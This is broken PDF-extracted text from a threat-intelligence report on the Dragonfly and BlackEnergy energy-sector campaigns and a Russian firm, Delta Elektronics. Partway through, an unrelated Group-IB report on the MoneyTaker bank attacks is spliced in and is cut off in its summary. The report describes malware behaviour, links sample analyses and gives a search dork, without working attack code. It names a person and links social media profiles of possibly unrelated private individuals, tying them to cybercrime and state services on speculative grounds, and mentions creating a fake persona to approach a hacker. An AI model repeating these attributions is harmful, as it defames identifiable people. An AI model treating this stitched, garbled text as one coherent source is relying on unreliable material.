between field devices in the substations and the control center.58  \nServers and workstations are used by management, HR, and finance staff to conduct business administration \noperations.\n \nExploitation method: \nMalware is retrieved from the network share and executed on networked devices \naccording\n \nto\n \ndirection received via domain controller policy or local Windows Task Scheduler.\n \nImpact: Targeted systems are rendered inoperable, and critical data \nis destroyed\n.\n \n \n \n  \nDragonFly\n \nAn ongoing \ncyberespionage\n \ncampaign against a range of targets, mainly in the energy sector, gave attackers the ability to \nmount sabotage operations against their victims. The attackers, known to Symantec as Dragonfly, managed to \ncompromise\n \n(Star Report, n.d.)\n \nsome\n \nstrategically important organizations for spying purposes and, if they had used the \nsabotage capabilities open to them, could have caused damage or disruption to energy supplies in affected countries.\n \nAmong the\n \ntargets of Dragonfly were energy grid operators, major electricity generation firms, petroleum pipeline \noperators, and energy industry industrial equipment providers. The majority of the victims were located in the United \nStates, Spain, France, Italy, Ger\nmany, Turkey, and Poland. \n(Dragonfly, n.d.)\n \nThe Dragonfly group is well resourced, with a range of malware tools at its disposal and is capable of launching attacks \nthrough\n \nsome\n \ndifferent vectors. Its most ambitious attack campaign saw it compromise \nsome\n \nindustrial control system \n(ICS) equipment providers, infecting their software with a remote access\n-\ntype Trojan. This caused companies to install the \nmalware when downloading soft\nware updates for computers running ICS equipment. These infections not only gave the \nattackers a beachhead in the targeted organizations\u2122 networks but also gave them the means to mount sabotage \n\noperations against infected ICS computers.\n \nThis campaign follo\nws in the footsteps of Stuxnet, which was the first known major malware campaign to target ICS \nsystems. While Stuxnet was narrowly targeted at the Iranian nuclear program and had sabotage as its primary goal, \nDragonfly appears to have a much broader focus \nwith espionage and persistent access as its current objective with \nsabotage as an optional capability if required.\n \nIn addition to compromising ICS software, Dragonfly has used spam email campaigns and watering hole attacks to infect \ntargeted organizations.\n \nThe group has used two main malware tools: Backdoor.Oldrea and Trojan.Karagany. The former \nappears to be a custom piece of malware, either written by or for the attackers.\n \n \nBefore\n \npublication, Symantec notified affected victims and relevant national autho\nrities, such as Computer Emergency \nResponse Centers (CERTs) that handle and respond to Internet security incidents.\n \nBackground\n \nThe Dragonfly group, which is also known by other vendors as Energetic Bear, appears to have been in operation since at \nleast 201\n1 and may have been active even longer than that. Dragonfly initially targeted defense and aviation companies \nin the US and Canada before shifting its focus mainly to US and European energy firms in early 2013. \n \nThe campaign against the European and Americ\nan energy sector quickly expanded in scope. The group initially began \nsending malware in phishing emails to personnel in target firms. \nThis behavior changed to \nwatering hole attacks \ncompromising websites likely to be visited by those working in energy to r\nedirect them to websites hosting an exploit kit. \nThe exploit kit\n, in turn,\n \ndelivered malware to the victim\u2122s computer. The third phase of the campaign was the Trojanizing \nof legitimate software bundles belonging to three different ICS equipment manufacture\nrs\n. These behaviors represent a \ncombined approach that continues to evolve but ensures weaknesses in software and the supply chain are equally \n\nexploited\n.\n \nDragonfly\u2122s behavior is representative of a state\n-\nsponsored operation.\n \nDragonfly\n \nmount\ns\n \nattacks throug\nh multiple vectors \nand compromise numerous third party websites in the process\n \nas a tool to ensure anonymity\n. Dragonfly \ntargeted\n \nseveral\n \norganizations in the \nenergy sector. \nIts current main motive appears to be cyberespionage, with sabotage a\n \ndefinite \nseco\nndary capability potentially for later use. \n \nTime analysis behaviors\n \nof timestamps on the malware used by the attackers\n \nindicate\ns\n \nthat \nthe group mostly worked \nbetween Monday and Friday, with activity mainly concentrated in a nine\n-\nhour period that correspon\nded to a 9\n \nam to 6\n \npm working day in the UTC +4 time zone. Based on this information, it is likely the attackers are based\n \nin Eastern Europe.\n \n(Energy Sector Alert, n.d.)\n \n  \nTools employed\n \nDragonfly uses two main pieces of malware in\n \nits attacks. Both are remote access tool (RAT) type malware which\n \n(Dragonfly vs. America, Courtesy of \nRussia ,\n \nn.d.)\n \nprovide\ns\n \nthe attackers with access and control of compromised \ncomputers. Dragonfly\u2122s favored malware tool is B\nackdoor.\n \nOldrea, which is also known as Havex or the Energetic Bear \nRAT. Oldrea acts as a\n \nbackdoor \n(Symantec, n.d.; Symantec, n.d.)\n \nfor the attackers on to the victim\u2122s computer, allowing \nthem to extract data and install further malware. \n \nOldrea appears to be custom malware, either written by the group itself or created for it. This provides some indication \nof the capabilities and reso\nurces behind the Dragonfly group. \n \nOldrea\u2122s behavior once installed is to\n \ngather\n \nsystem information, along with lists of files, programs installed, and\n \nthe\n \nroot \nof available drives. It will also extract data from the computer\u2122s Outlook address book and VPN\n \nconfiguration files. This \ndata is then written to a temporary file in an encrypted format before being sent to a remote command\n-\nand\n-\ncontrol (C&C) \nserver controlled by the attackers. \nThe file obfuscation ensures anonymity of content.\n \nThe C&C servers appear\n \nto be hosted on compromised servers running content management systems, indicating that the \nattackers may have used the same exploit to gain control of each server.\n \nThis behavior follows the model of maskirovka.\n \nOldrea has a basic control panel which allo\nws an authenticated user to download a compressed version of the stolen data \nfor each particular victim. \n \nThe second main tool used by Dragonfly is Trojan.Karagany. Unlike Oldrea, Karagany was available on the underground \n\nmarket. The source code for versio\nn 1 of Karagany was leaked in 2010. Symantec believes that Dragonfly may have taken \nthis source code \nand modified it for its own use thereby further validating the risk of leaving cyber weaponry on the \nbattlefield.\n \nThis version is detected by Symantec as T\nrojan.Karagany!gen1.\n \n \nKaragany is capable of uploading stolen data, downloading new files, and running executable files on an infected \ncomputer. \nKaragany has additional behaviors  such as  r\nunning additional plugins, \nusing\n \ntools for collecting passwords, \nt\naking screenshots, and cataloging documents on infected computers\n. The intent to analyze the data for later exploitation\n. \n \nSymantec found that the majority of computers compromised by the attackers were infected with Oldrea. Karagany was \nonly used in aroun\nd 5 percent of infections. \n \nMultiple attack vectors\n \nThe Dragonfly group has used at least three infection \nbehaviors\n \nagainst targets in\n \nthe energy sector. The initial behavior\n \nwas an email campaign, which saw \ntargeted \nexe\ncutives and senior employees in ener\ngy \ncompanies receive emails \ncontaining a malicious PDF attachment. Infected emails had one of two subject lines: \ufb01The account\ufb02 or \ufb01Settlement of \n\ndelivery problem\ufb02. \n \nThe spam campaign began in February 2013 and continued into June 2013. Symantec identified \nseven different \norganizations targeted in this campaign. \nThis behavior ceased as organizational defenses improved.\n \nThe attackers then shifted their \nbehaviors\n \nto watering hole attacks, comprising \nsome\n \nenergy\n-\nrelated websites and injecting \nan iframe into eac\nh which redirected visitors to another compromised legitimate website hosting the Lightsout exploit kit. \nLightsout exploits either Java or Internet Explorer to drop Oldrea or Karagany on the victim\u2122s computer. The fact that the \n\nattackers compromised multip\nle legitimate websites for each stage of the operation is further evidence that the group \nha\ns strong technical capabilities while changing tactics. The tactics may have changed due to vendor reporting on \nadversary behaviors.\n \nIn September 2013, Dragonfly be\ngan using a new version of this exploit kit, known as the Hello exploit kit. The landing \npage for this kit contains JavaScript which fingerprints the system, identifying installed browser plugins. The victim is the\nn \nredirected to a\nn\n \nURL which in turn deter\nmines the best exploit to use based on the information collected.\n \n \n Trojanized software\n \nThe most ambitious attack vector used by Dragonfly was the compromise of \nsome\n \nlegitimate software packages. Three \ndifferent ICS equipment providers were targeted\n, \nand ma\nlware was inserted into the software bundles they had made \navailable for download on their websites. All three companies made equipment that is used in \nsome\n \nindustrial sectors, \nincluding energy.\n \nDelta Electronics, which we cover later in this document, cou\nld be subjected to the same malware. \n \nThe first identified Trojanized software was a product used to provide VPN access to programmable logic controller (PLC) \ntype devices. The vendor discovered the attack shortly after it was mounted, but there had alread\ny been 250 unique \ndownloads of the compromised software.\n   \nThe second company to be compromised was a European manufacturer of specialist PLC type devices. In this instance, a \nsoftware package containing a driver for one of its devices was compromised. Sym\nantec estimates that the Trojanized \nsoftware was available for download for at least six weeks in June and July 2013. \n \nThe third firm attacked was a European company which develops systems to manage wind turbines, biogas plants, and \nother energy infrastruc\nture. Symantec believes that compromised software may have been available for download for \napproximately ten days in April 2014.  \n \nThe Dragonfly group is technically adept and able to think strategically. Given the size of some of its targets, the group \n\nfound a \ufb01soft underbelly\ufb02 by compromising their suppliers, which are invariably smaller, less protected companies.\n \nUnauthorized resellers were not examined as part of the analysis nor was the potential for \ufb01knock off\ufb02 companies selling \n\ncounterfeit hardware\n. \n Delta \nElektronics\n \nIntelligence/Reconnaissance:\n \nRussian information on the formation of the companies established under the name of Oleg Vladimirovich Strekozov. \nBegin dates of the companies and the monies used to create the companies is listed below\n. Recovered documents indicate \nother names involved in certain companies under the Oleg name. \n \n(Registration numbers of Russian companies., n.d.)\nINN \n\u0152 \nIdentifying Tax Number of a tax\n-\npayer (consists of 10 digits). Each \nRussian co\nmpany has its unique tax number concerning all taxes and duties. Usually\n, \nan abbreviation \"INN\" is used in \nEnglish letters. INN number is given to a Russian company by the respective state tax body at the moment of company\u2122s \ntax registration in the place o\nf its legal address. As a proof of tax registration, the company receives a certificate with INN \nissued by the tax body. INN is included in all tax notices and declarations, as well as in Russian bank transfer documents. \n\nINN is enough to receive much offic\nial info about a Russian company from the Federal Register of Russian companies \n- \n\"EGRUL\n.\"  \nOGRN\n \nOGRN \n\u0152 \nMajor State Registration Number of the entry made in the Register about\n \nthe\n \nformation of a Russian company \n(consists of 12 digits). Provided the company\n \nwas registered before July 1, 2002, OGRN is the number of\n \nthe\n \nentry\n \nin the \nRegister about\n \nthe\n \nfirst filing of information into the Register about the company according to the federal law. Each legal \nperson in Russia has its unique OGRN. OGRN is used in th\ne Register as the number of registration file of a company. As a \nproof of its OGRN, a company receives the certificate with OGRN issued by the state registration body. OGRN is included \n\ninto all entries in the Register, all documents issued on specific regi\nstration actions. OGRN number lets you receive much \nofficial info about a Russian company from the Register.\n \nCompany Name\n \nEntry Date\n \nStarting Capital\n \nUS Dollars\n \nDate Ended\n \nAutopak\n-\nVolga\n \n3/14/2008\n \n10,000 Rubles\n \n$161.90 \n3/28/2012\n \nAyut\n \n5/8/2010\n \n40,000 \nRubles\n \n$647.00 \nDelta \nElektronics\n \n9/11/2012\n \n20,000 Rubles\n \n$323.81 \nEmilina\n \n8/4/2010\n \n40,000 Rubles\n \n$647.00 \nIntelGrupp\n \n8/12/2010\n \n40,000 Rubles\n \n$647.00 \n8/21/2013\n \nTekstiltorg\n \n8/31/2010\n \n20,000 Rubles\n \n$323.81 \nNIKS\n \n9/6/2010\n \n50,000 Rubles\n \n$809.52 \n6/10/2013\n \nPrima\n \n9/9/2010\n \n10,000 Rubles\n \n$161.90 \n9/1/2014\n \nMisteriya\n \n9/20/2010\n \n10,000 Rubles\n \n$161.90 \nTDSaturn\n \n9/20/2010\n \n10,000 Rubles\n \n$161.90 \nMagnum\n \n10/12/2010\n \n50,000 Rubles\n \n$809.52 \nRakurs\n \n6/23/2011\n \n50,000 Rubles\n \n$809.52 \n Nyu\n-\nLajn\n \n7/22/2011\n \n15,000 Rubles\n \n$242.86 \nEkonomMarket\n \n8/31/2011\n \n60,000 Rubles\n \n$971.43 \nStroy Holding\n \n9/12/2011\n \n50,000 Rubles\n \n$809.52 \nMTK\n \n12/13/2011\n \n20,000 Rubles\n \n$323.81 \nInrost\n \n8/27/2012\n \n20,000 Rubles\n \n$323.81 \nVintazh\n \n11/1/2012\n \n12,000 Rubles\n \n$194.29 \n$8,530.50 \nThe company stated as running Delta \nElektronics\n \nis the Matrix Group, LLC. Little information is available at this time \non\n \nthe Matrix Group, LLC.  No information exists on this company \nbeing created\n \nin Russian \ntax records.\n \n \nDelta Elektronics \nand Dragonfly?\n \nRaw data and information review\n \n\ndocumented Operation Dragonfly (AKA Energetic Bear) three years ago as a Russian spear \nphishing organization. \n \nhttp://www.sym\nantec.com/security_response/writeup.jsp?docid=2014\n-\n061601\n-\n3811\n-\n99&tabid=2\n \nhttp://www.symantec.com/connect/blogs/dragonfly\n-western-energy-\ncompanies\n-\nunder\n-\nsabotage\n-\nthreat\n \nhttps://www.f\n-\nsecure.com/weblog/archives/00002718.html\n \n(Delta Ele\nkronics, n.d.)\nDelta Electronics has two locations in Russia. Saint Petersburg and Moscow. \nAddress:\n \n105082, Moscow, Semyonov lane, 15, office 615 (Eastern District).\n \nPhone:\n \n+7 (495) 984\n-\n51\n-\n05 (Moscow)\n \nPhone:\n \n8 (800) 555\n-\n90\n-\n55 (weekdays from 9:00 to 18\n:00, a call from the regions of Russia\n \nGetting there:\n \n3 minutes walk from the metro station \n\"Semenovskaya\n.\"\n \nAddress:\n \n195027, St. Petersburg, Shahumyan Avenue, Building 4 (Krasnogvardeyskiy district) Business center \"Aurora City\n,\"\n office \n320.\n \nMetro:\n Novocherkassk \nDistance:\n \n10 min.\n O\nn foot\n \nEmail: info@delta\n-\nmail.ru and info@delta\n-\nelectronics.info\n \nThe Matrix Group, LLC information:\n \nPhone / fax: +7 (495) 984\n-\n51\n-\n05 (Moscow) +7 (812) 640\n-\n46\n-\n90 (St. Petersburg), E\n-\nmail: info@matrixgroup.\nsu. \u00a9 2004\n-\n2012 \u00abMatrix \nGroup\n.\" \nTreadstone 71 found ties to another company \n\u0152 \nVacon (vacon.com and vacon.ru). \nOf note, payments for products from Delta Electronics is by cash courier or via Yandex and WebMoney indicating an organizatio\nn that \nis not \nlegitimate.\n  \n Establish an initial relationship with a Russian hacker on referenced off vk.com (https://xakep.ru/) under and \n(https://vk.com/xakep_mag) the newly created persona of Oleg Vladimirovich Strekozov.  \n \nThere \nare\n \nsome uncertainty and plenty of lea\nds to follow \nto\n \nbe thorough and not leave anything unnoticed. Having said \nthis, the recommendations offered online are valid no matter what further research reveals. If any organizations bought \nPLCs from either Delta company, better do an\n \nemergency securit\ny review now.\n \n \nTied to Oleg Strekozov\n \n \nOne is Delta \nElektronics\n \n \nLocations in St. Petersburg and Moscow\n \n \nSame logo as Delta Electronics \n\u0152 \nTaipei, Taiwan\n \n \nThey manufacture PLCs and program them\n \nCould Delta \nElektronics\n \nmanufacture the same as knock\n-\noffs?\n \n\ufb01All the\n \nIP \nA\nddresses and Domains owned by Strekozov Oleg Vladimirovich are known for Zeus, SpyEye, Blackhole, \nMalware, Crimeware, Scams\n, \nand SPAM\n, \netc.  Strekozov Oleg Vladimirovich also controls domains within the \nformer Soviet Union TLD\n.su\n.\ufb01\n \n \nIt is highly unlikely that anyone would use their own name assigned to such activities, openly using the name in \ndomain registrations and then openly own over 20 companies (oil and gas) in Russia along with scores of others. \nIt is highly unlikely that someone of that stature\n \nin Russia (financial) in and around Moscow, would not show up \nin people searches using Russian search engines but for domain name registrations \n\u0152 \ncompany ownership.\n \n \nSe\narches on Oleg Vladimirovich Strekozov \n\u0152 \nfinding nothing of direct ties to a person\n \n \nVlad\nimir Strekozov \n\u0152 \nretired Russian judge\n \n \nOleg Strezkozov \n\u0152 \naside from hacking sites:\n \nhttps://www.facebook.com/oleg.strekozov/about\nhttps://plus.google.com/106396297467067086741/about\nhttp://vk.com/oledjanqi\nk\nh\nttp://loveplanet.ru/page/749987781752/\n  \n \nNone \nof which tie to someone old enough and financially viable to own scores of companies.\n \n \nThe address given for Oleg in your domain name searches is \ndead center Red Square\n \n-\n \nRussia, 107031, \nMoscow, P\nroezd Dmitrosvkiy 8 (yandex.com \n\u0152\n \nmaps)\n \nhttps://www.linkedin.com/company/delta\n-\nelectronics\n \nGlobal HQ \n\u0152\n \nTaipei, Taiwan\n \nFounded 1971\n \nEmployees 80k\n \nRevenues $7B\n \n \nhttp://www.deltaenergysys\ntems.com/en/about\n-\nus.htm#tab178\n \nGaps and Assumptions\n \nTreadstone 71 believes it would be good to know some more d\netails about how PLCs \nare used\n \nin oil and gas \ntransportation. How many \nare deployed\n \nin\n \nthe\n \ntypical\n \npipeline? What are key vulnerable \npoints\n?\n \nHow many would \nhave to be attacked to create some stoppage for a significant \nperiod\n? Also, it would be very interes\nting to know about \nDelta's legitimate business. Who buys from\n \nthem and with how much volume?\n \nWhat appears clearly is that there is a bunch of companies registered to this Oleg Strekozov and that his name also \nappears in some WHOISs about shady sites and th\nat he has some association with malware. Whether he is corporeal \nor virtual, Mr. Strekozov \nis associated\n \nwith Russian cyber organized crime. Treadstone 71 can immediately say that \nsuccessful organizations of this type are associated with FSB and controlled\n \nby oligarchs. Successful oligarchs are close \nto Putin and, of course, Putin controls the FSB. Real or unreal, Mr. Strekozov\n \nis a tool of such a hierarchy.\n \nTreadstone 71 is careful to leap to conclusions about whether Mr. Strekozov is real. He could be a m\nade\n-\nup name \nused for certain \nregistrations\n,\n \nor he could be the weekend doorman at Lubyanka (in jest). But he could be real. His \npatronymic is \nVladimirovich\n \nso that\n \nthe judge could be his father. A look at Facebook finds an Oleg in the Belarusan \ntown of Hly\nbokaye, educated in eastern Ukraine, about 25 years old.  We do not discount him because of age\n--\nbillions \n\nchange hands hourly in \nMoscow\n,\n \nand there are plenty of young criminals driving Maserati\u2122s with a bottle of expensive \nwhisk\ne\ny\n \nin their hand. Real or un\nreal, S's \naddress of Proezd Dmitrovskiy is in an \nupscale neighborhood that is also not far \nfrom\n \nLubyanka.\n \n \nEuropean locations \n\u0152\n \nno mention of \nRussia\n \n \nAsian locations \n\u0152\n \nno mention of Russia\n \n \nSeveral US locations including Houston\n \n  \nDelta or Delta? The more Trea\ndstone 71 \ninvestigates on this company, the more \nskeptical we have become about the \ninnocence of the Taiwanese company. \nWe have found that the Russian Delta has \nattended trade shows and held press \nconferences. With thousands of dollars \nof sales and only a \nlimited number of \ncompanies that make PLCs, do we believe \nthat some people in Taipei are unaware \nabout this? Treadstone 71 has discovered \nother companies that do business in \nRussia\n \nbut try not to advertise that in the \nWest. Could it be that Delta\n-\nRu is buy\ning \nor arranging sales and Delta\n-\nTai is happy \nto turn away from this? The price for \ndoing such business in and through \n\nRussia is, of course, to take Russian \npartner. Either way, the possibility of \nsupply chain contamination is real.\n \nIn applying an informal\n \nanalysis of \ncompeting\n \nfor a\n \nhypothesis\n \nto all this, \nTreadstone 71 has come up with two \nmore hypotheses that fit the facts (as \nthey stand now, understanding that \nmore information and analysis is \nneeded). \n \nThis\n \ncould be an effort to cause serial \nfailures th\nat could drive up energy prices, \nalthough the coordination and precision for this to work past a fe\nw days would be extraordinary. \n \nAnother possibility is that this is just a scheme for some oligarchs to make money. They speculate on buying a tanker \nfilled \nwith crude. While tanker is at sea, an incident occurs at some pipeline or port spiking the price of oil and Oleg's \ntanker pulls int\no Rotterdam right at the peak. \n \nFinally, this could be just a part of a Russian medium\n-\nterm strategy to contaminate as much hardware, \nfirmware\n,\n \nand \nsoftware as possible. \n \n \nName \nof Delta\n \nElectronics\n \n \nAddress Moscow\n, Semenovskiy per., 15, \nof\n.\n \n615\n \n \nEmail  info@deltaelectronics.su\n \n \nSection  \nIndustrial equipment\n \n \nPhone:+7 (495) 9845105, 8 (800) 5559055  \n-\n \nDifferent locations than that of Oleg\u2122s site for Delta \nElektronics\n \n\u0152\n \n \n  \n \nOleg does not show up in any people searches in Russia yet appears as a hacker and as an owner of scores of \ncompanies.  Is\n \nit likely that this can be both accurate and true?\n \n \nTreadstone 71 does not believe this is true.  \n \n \nGazprom has direct operations in Kyrgyzstan\n \n \nOleg Vladimirovich Strekozov does not seem to exist\n \n \nVladimir Strekozov was a constitutional court judge \n\u0152\n \nhardly\n \na hacker\n \n \nNot the same as Oleg Vladimirovich Strekozov\n \n \nAny searches of Oleg Strekozov \nabout\n \nOil and Gas only brings up site registration\n \n \nNo mention of someone who owns so many firms in and around Moscow (expensive)\n \n \nNo mention of someone who owns first in t\nhe \nKyrgyz area related to Gazprom\n \n \nIt is more likely that Oleg Strekozov is just a name \nbacked by Russian\n \ngovernment funding. \nThe \nl\nocation\n \nis Red Square. \ufb01Thumbing their \nnose\n.\n\ufb02\n \n \nQuestion: Why duplicate Delta Electronics if they \nare not the same company?\n \n \nWhat\n \ncould the motivation for Russia be to pose \nas Delta Electronics?\n \n \nHardware used in gas and oil production\n \n \nSold in international markets \n\u0152\n \nglobal name \n\u0152\n \naccepted \n\u0152\n \ntrusted\n \nTreadstone 71 can imagine all kinds of functions that could \nbe contaminated\n \nwith logic bombs \nand\n \nbackdoors\n, ready \nfor the call of t\nhe Rodina (Russian Motherland).\n \nIt should \nbe noted\n \nthat these three hypotheses are not mutually exclusive of one another as the mot\nivations could \nlogically coexist.\n \n  \nAnalysis of \nCompeting Hypotheses\n \nI\n \n  \n \nAnalysis of Competing Hypotheses\n \nII\n \n \n  In \nSummary\n \nAlthough there is an absence of evidence \nsupporting a direct alignment of \nBlackEnergy, Dragonfly, and Delta \nElektronics, \nthe similarity\n \nof the targets, \nass\numed adversary intent,\n \nthe\n \nbehaviors \nand methods of deception are consistent \nwith nation\n-\nstate actions. We estimate the \nlikelihood of Russian complicity to be \n\nprobable. The evidence collected and \nsubsequent analysis using structured \ntechniques does not render our judgment \nto be fact or a cert\nainty, however, and \nsuch judgments still carry a risk of being \nwrong. Some of the information is \nfragmented and\n \npoorly corroborated to make solid analytic inferences\n. Some sources are difficult to validate.\n \nTypical \ncompartmentalization of intelligence acti\nvities may be used to ensure complete lack of awareness of activities at the \n\noperational level. Leadership over the groups behind BlackEnergy, Dr\nagonfly, and Delta Elektronics may be limited in a \n\ufb01Dunbar\u2122s number\ufb02 method of maintain secrecy. \n \nWe cannot rule out direct Russian involvement based upon previous judgments and \nbehaviors\n \nby the Russian government\n \nand Russian proxies\n. Historical profiling of Russian activities indicate\ns \nat a minimum, their participation in these activities. \nA\ndversary intent, wheth\ner it is BlackEnergy, Dragonfly, or Delta Elektronics \ncombined with expert capabilities \nenables a \nhigh probability of threat. Additionally, the probability of threat occurrence in unison with the success of the actions and \n\nthe overall impact(s) when examin\ned considering\n \nthe Ukrainian attacks\n, represents \nan elevated level\n \nof risk. \n \nThe use of hybrid warfare \nmethods in combination with constantly moving attack vectors makes difficult\n, \nattribution and \nmethods of defense. \nThe adversary(s) behind the actions dem\nonstrate information superiority while revealing behaviors \nwith similarities. Continued data and information collection for analysis is required but serves as a double\n-\nedged sword. \nThis sword ensures we continue to churn examining multiple different versio\nns of information using limited resources \nwhile missing the primary intent and potentially simple conclusion as to the intent and success of the adversary(s).\n \nT71\n \n  \nInfection Examples\n \n \nhttps://www.hybrid\n-\nanalysis.com/sample/5e0c99e6350fd89a7b0d2dd480873ef2f2f566b8a41848a794cc7fa458c0a7ad?environmentId=100\n \nhttps\n://www.reverse.it/sample/41cc903cd5fa2516855cffc80ae5724a3fffee795c79aa81ea136e94db2bd34f?environmen\ntId=100\n \nhttps://malwr.com/analysis/NzgzZmRhZjM5MjczNDc2NTg1ODY1ZTQxY\nzNkYWRlYjU/\n \n \n  \n  \nSearch Criteria\n \nExample:\n \nsite:.com | .edu | .org | .uk | .net | .gov | .mil | .su | .ru | .tw | .ir dcisoft_v1.12\n \n \n \n  \n  \n \n \n  \n \n \n\n \n\n \n \n \n  \n  \n  \n Bibliography \nAapo Cederberg and Pasi Eronen\n, \ufb01How are Societies \nDefended against Hybrid Threats?\ufb02 Geneva Centre for Security \nPolicy, September 2015. (http://www.gcsp.ch/News\n-\nKnowledge/  Publications/How\n-\nare\n-Societies-Defended-\nagainst\n-\nHybrid-\n  \nThreats); Keir Giles, \ufb01Western Media Must Get Creative in Infowar,\ufb02 The Mosco\nw Times (Russia), August 4, \n2015.\n \nAndr\u00e1s R\u00e1cz,\n \n\ufb01Russia\u2122s Hybrid War in Ukraine: Breaking the Enemy\u2122s Ability to Resist,\ufb02 The Finnish Institute of \nInternational Affairs, June 16, 2015. (http://www.fiia.fi/en/publication/514/ russia_s_hybrid_war_in_ukraine/)\n \nAntiy\n. (n.d.). \nC\nomprehensive Analysis Report on Ukraine Power System : http://www.antiy.net/p/comprehensive\n-\nanalysis\n-\nreport\n-\non\n-\nukraine\n-\npower\n-\nsystem\n-\natt\n \nDouris, C\n. (2017, January 9). \nCyber Threats to the U.S. Electric Grid Are Real\n. \nRetrieved from The Buzz: \nhttp://nationalinterest.org/blog/the\n-\nbuzz/cyber\n-\nthreats\n-\nthe\n-\nus\n-\nelectric\n-\ngrid\n-\nare\n-real-\n19000\n \nD\nelta Elekronics\n. (n.d.). Cyber Shafarat: ttps://treadstone71llc.files.wordpress.com/2016/04/delta\n-\nelektroniks.pdf\n \nDLELY Key Statistics\n - \nDelta Electronics Inc.\n \n(2017, January 15). Delta Electronics Inc.: \nhttp://www.marketwatch.com/investing/stock/DLELY/profile\n \nDragonfly vs. America, Courtesy of Russia : http://founderscode.com/dragonfly\n-\nvs\n-america-\ncourtesy\n-\nof\n-\nrussia/\n \nDragonfly\n. (n.d.). Western Energy Companies Under Sabotage Threat : https://malwaretips.com/threads/dragonfly\n-\nwestern-energy-\ncompanies\n-\nunder\n-\nsabotag\n \nEnergy Sector Alert\n. (n.d.). Dragonfly Attack /: http://www.isssource.com/energy\n-\nsector\n-alert-\ndragonfly\n-\nattack\n \nJohnIB\n. (n.d.). \nRussian hackers penetrated US electricity grid: https://johnib.wordpress.com/2016/12/31/russian\n-\nhackers\n-\npenetrated\n-\nus\n-electricit \nKeir Giles, Philip Hanson, Roderic Lyne, James Nixey, James Sherr, and Andrew Wood\n, \ufb01The Russian Challenge,\ufb02 Chatham \n\nHouse, Jun\ne 2015, (https://www.chathamhouse.org/ sites/files/chathamhouse/field/field_document/20150605Russian \nChallengeGilesHansonLyneNixeySherrWood.pdf)\n \nMazarr, M. J.\n \n(2015). \nMastering the Gray Zone: Understanding a Changing Era of Conflict.\n \nStrategic Studies Institute.\n \nR\negistration numbers of Russian companies.\n \n(n.d.). INN number: http://intranorm.com/en/comm/ogrn\n-\nand\n-\ninn\n-\nen.html\n \nStar Report\n. (n.d.). Dragonfly Cyberespionage Attacks \n- \nHITECH : \nhttp://research.hitechanswers.net/content41603\n \nSymantec\n. (n.d.). Backdoor.Oldrea and Trojan.Karagany : \nhttps://community.mcafee.com/thread/70047?start=0&tstart=0\n \nTimeline: Ten Years of Russian Cyber Attacks on Other\n. (n.d.). NBC News: http://www.nbcnews.co\nm/storyline/hacking\n-\nin-america/timeline-\nten\n-years-\nrussian\n-c \n \nWHEN THE LIGHTS WENT OUT\n: \nhttp://docplayer.net/31222353\n-\nWhen\n-\nthe\n-lights-\nwent\n-\nout\n-a-\ncomprehensive\n-review-\nof\n \n  \n \n \n \n ", "1\nMoneyTaker\n1.5 YEARS OF SILENT OPERATIONS\nwww.group-ib.com\nDecember 2017\n 2\nTABLE OF CONTENTS\n \nSummary\n \n3\nAttack infrastructure\n \n7\nProvision of the malware survivability\n \n11\nPropagation across the network\n \n12\nSpying on legitimate users\n \n15\nAttack on AWS CBR\n \n19\nPotential attacks on SWIFT\n \n25\nAttack on card processing\n \n26\nUsing banking Trojans\n \n27\nUsing POS Trojans\n \n28\nRecommendations\n \n29\nIndicators of compromise\n \n31\n 3\nTargets\n\u0141\n \nIn total Group-IB has confirmed at least 20 companies as \nvictims of the MoneyTaker group, 16 of which are located \n\nin the US. The vast majority of them are small community \n\nbanks, where hackers attacked card processing systems. The \n\naverage damage from each successful attack was 500,000 \n\nUSD baseline.\n\u0141\n \nCriminals stole documentation for OceanSystems\u2122 FedLink \n\ncard processing system, which is used by 200 banks in Latin \nAmerica and the US. We believe that banks operating on this \ninfrastructure are at risk of being amongst the next targets of \nMoneyTaker group.\n\u0141\n \nIn Russia, they focus on attacks on the system of interbank \n\ntransfers AWS CBR (Russian Interbank payment system). The \n\naverage amount of damage caused by this theft scheme is \n\n1.2 million USD per incident. That said, the affected banks \n\nmanaged to return some portion of the stolen money.\nTools and tactics\n \nAttackers use both borrowed and their own self-written tools. \n\nWhen attacking, hackers act creatively and wisely: they use \u00abone-\n\ntime\u00bb infrastructure and carefully erase traces of their activity \n\npost-incident.\nInfiltration \n\u0141\n \nTo penetrate the corporate network, the group uses legitimate \npen testing tools - Metasploit and PowerShell Empire.\n\u0141\n \nAfter successful infection, they carefully erase malware \n\ntraces. However, when investigating one of the incidents, we \n\nmanaged to discover the initial point of compromise: hackers \npenetrated the bank\u2122s internal network by gaining access to \nthe home computer of the bank\u2122s system administrator.\nStealthy techniques \n\u0141\n \nThe group uses \u201afileless\u2122 malware which only exists in RAM \nand is removed on rebooting.\nFrom May 2016 to November \n\n2017, at least 20 organisations \n\nwere attacked in the United \n\nStates, UK and Russia. At \n\nleast one of the US banks was \n\nsuccessfully robbed twice. \nIn addition to money, attackers \nstole documentation related \nto the interbank payment \nsystems, which appear to have \nbeen obtained to prepare \nfurther attacks. \nBased on analysis of these \nincidents, attack tools and \n\nthe tactics applied, we have \n\nconcluded that the same \n\ngroup, which Group-IB has \n\ndubbed MoneyTaker (after the \n\nmalware used) is behind these \n\nattacks. It is interesting to note \n\nthat despite the effectiveness \n\nof the attacks, they have gone \n\ncompletely unreported till now.\nSUMMARY\n01\n 4\n\u0141\n \nTo protect C&C communications from being detected by \nsecurity teams, hackers employ SSL certificates generated \n\nusing names of well-known brands: Bank of America, Federal \n\nReserve Bank, Microsoft, Yahoo, etc.\n\u0141\n \nServers used to perform initial infection are one-time \ncomponents which are changed immediately after a successful \ninfection.\nAttack tools\nMembers of the group are skilled enough to promptly adjust the \ntools applied. In some cases, they made changes to the source \ncode \u201aon the fly\u2122 - during the attack.\nTracking the attacks\n\u0141\n \nServers used to conduct the attacks were specifically \n\nconfigured to deliver the malicious payload to a pre-\n\ndetermined list of IP addresses belonging to the target \n\ncompany. This methodology was employed by attackers to \n\nprevent the payload from falling into the hands of security \n\nanalysts and experts.\n\u0141\n \nAfter each round of attacks, hackers deploy new infrastructure \nfor network persistence.\n\u0141\n \nIn detected incidents, criminals used a program that should \nhave carefully removed all components of the programs \n\napplied. However, due to an error made by the developer, \n\nthe data were not deleted from the attacked machines, which \n\nenabled forensic experts to learn details of the hackers\u2122 \n\nactivity.\nCreated tools\nBorrowed tools\nMoneyTaker 5.0 - malicious program \n\nfor auto replacement of payment data \n\nin AWS CBR\nMetasploit and PowerShell Empire\n\u201aScreenshotter\u2122 and \u201akeylogger\u2122 to \n\nconduct espionage and capture 